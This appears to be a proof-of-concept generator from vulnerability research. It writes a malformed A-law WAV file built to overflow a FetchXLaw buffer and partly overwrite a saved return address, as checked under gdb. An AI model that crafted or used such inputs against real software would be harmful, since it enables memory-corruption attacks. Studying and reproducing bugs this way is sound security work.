#!/usr/bin/env python3
"""Generate the 142-byte A-law WAV used by the partial saved-RIP overwrite check.

142 data bytes -> FetchXLaw length=142 -> out=&buffer[564] -> final store at
buffer+1128, exactly the low four bytes of the no-SSP saved RIP; the high four
bytes stay 0x00005555. See gdb-partial.cmd and PROVENANCE.md (W184).
"""
import struct
import sys
from pathlib import Path

OUT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).parent / "evidence"

payload = bytes((0x55 + (i & 0x3F)) & 0xFF for i in range(142))
fmt = struct.pack("<HHIIHH", 6, 1, 8000, 8000, 1, 8)
body = b"WAVE" + b"fmt " + struct.pack("<I", len(fmt)) + fmt
body += b"data" + struct.pack("<I", len(payload)) + payload
blob = b"RIFF" + struct.pack("<I", len(body)) + body

OUT.mkdir(parents=True, exist_ok=True)
p = OUT / "alaw142.wav"
p.write_bytes(blob)
print(f"{p}: {len(blob)} bytes sha256={__import__('hashlib').sha256(blob).hexdigest()}")
